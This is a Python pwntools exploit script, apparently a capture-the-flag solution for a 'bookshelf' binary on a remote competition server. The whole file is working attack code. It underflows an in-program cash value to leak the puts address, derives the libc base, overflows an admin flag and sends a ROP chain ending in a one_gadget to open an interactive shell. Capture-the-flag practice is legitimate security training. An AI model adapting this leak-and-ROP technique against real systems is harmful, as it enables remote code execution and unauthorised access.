#!/usr/bin/python3
from pwn import *

#p = process('./bookshelf.bin')

'''
p = gdb.debug('./bookshelf.bin', """
  b *0x401633 
  continue       
""")
'''

p = remote('chal.pctf.competitivecyber.club', 4444)


bin_sh_offset = 0x1d8698


def buy_hacksby():
    p.recvuntil('out')
    p.sendline('2')
    p.recvline()*8
    p.sendline('2')
    p.sendline('y')

def get_puts():
    for i in range(8): #underflow cash
        buy_hacksby() 
    p.recvuntil('out')
    p.sendline('2')
    p.recvline()*8
    p.sendline('3')
    book = p.recvuntil('End.')
    puts = int(str(book).split('glory')[1].split('rested')[0], 16)
    p.sendline('n')
    return puts

def overflow_admin():
    p.recvuntil('out')
    p.sendline('1')
    p.recvline()
    p.sendline('y')
    p.sendline(b'\x01'*40)

def get_shell(puts: int):
    libc_base = puts - 0x80ed0
    one_gadget = libc_base + 0xebcf8
    pop_rsi = libc_base + 0x126101
    pop_rdx_rbx = libc_base + 0x90529
    data_section = 0x404100

    p.recvuntil('out')
    p.sendline('3')

    payload = b'A'*48
    payload += p64(data_section)
    payload += p64(pop_rsi)
    payload += p64(0x0)
    payload += p64(pop_rdx_rbx)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(one_gadget)
    p.sendline(payload)

    
puts = get_puts()
overflow_admin()
get_shell(puts)

p.interactive()